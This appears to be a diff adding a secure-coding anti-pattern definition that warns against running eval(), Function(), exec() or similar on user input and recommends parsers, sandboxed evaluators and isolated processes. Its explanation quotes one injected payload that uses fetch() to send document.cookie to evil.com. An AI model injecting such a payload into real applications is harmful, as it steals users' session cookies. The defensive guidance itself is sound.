@@ -1,0 +1,35 @@
+anti-pattern EvalUserInput {
+  id: "@community/anti-pattern-eval-user-input"
+  version: "1.0.0"
+
+  label: "eval() / Function() / exec() on user input"
+  domain: security
+
+  _meta: {
+    license: "Apache-2.0"
+    license-provenance: "package-authorship-claim"
+  }
+
+
+  description: "Passing user-controlled strings directly to dynamic code evaluators — JavaScript eval(), Function constructor, Python exec()/eval(), Ruby eval/instance_eval, PHP eval() — resulting in arbitrary code execution."
+
+  why-bad: "User input → arbitrary code execution (ACE/RCE). eval('1+' + userInput) where userInput = '1; fetch(\"https://evil.com/?c=\" + document.cookie)' yields full XSS with data exfiltration in <100 characters. Across languages the same pattern is catastrophic: JavaScript Function constructor runs in the same execution context as eval; Python exec(input()) was the textbook RCE example for decades; PHP's preg_replace /e modifier (now deprecated) evaluated the replacement as PHP. Even in template engines: if a user controls the template string (not just data), Handlebars/Pug/Nunjucks precompilation paths can execute arbitrary code."
+
+  instead-do: "Use parsing libraries for structured data: JSON.parse() for JSON, csv-parse for CSV, date-fns/date-parse for dates. If the use case is user-supplied expressions or formulas, use a sandboxed evaluator (mathjs for math expressions, jsep for expression parsing without evaluation). If you genuinely need user-supplied code, run it in an isolated process (Node.js worker_thread with no shared memory, Web Worker with limited API surface, Docker container with seccomp profile). Always validate input against a strict allowlist before any evaluation path."
+
+  notes: [
+    "JavaScript: new Function('return ' + userCode) is equivalent to eval — same global context, same danger",
+    "Python: exec(compile(src, '<string>', 'exec'), {'__builtins__': {}}) is NOT safe — __builtins__ can be reconstructed",
+    "PHP: preg_replace('/pattern/e', userReplacement, string) — deprecated in PHP 5.5, removed in PHP 7; still found in legacy codebases",
+    "Ruby: instance_eval / class_eval on user strings = full object model access, not just expression evaluation",
+    "Template injection (SSTI) is the same pattern: if user controls template source in Jinja2/Twig/Freemarker, it becomes RCE",
+    "For formula fields (spreadsheet-like): mathjs evaluates math expressions without general code execution — the right tool for the job",
+  ]
+
+  related: [
+    @community/principle-owasp-injection,
+    @community/pattern-input-validation-allowlist,
+    @community/pattern-csp-strict,
+    @community/check-content-security-policy,
+  ]
+}
